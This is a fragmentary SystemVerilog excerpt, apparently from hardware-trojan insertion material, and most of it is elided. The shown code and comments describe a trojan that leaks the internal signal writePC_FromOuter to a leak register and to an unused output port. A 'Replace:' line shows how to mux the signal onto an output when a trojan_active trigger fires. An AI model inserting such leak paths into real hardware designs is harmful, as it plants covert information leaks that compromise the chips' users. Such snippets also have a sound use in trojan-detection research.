 ...
 * Payload: Route writePC_FromOuter to leak port
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        trojan_leak_data <= writePC_FromOuter;
    end
end
...
// ============================================================
// Information Leak: Route writePC_FromOuter to unused output
//
...
//   Replace: assign output_signal = trojan_active ? writePC_FromOuter : normal_value;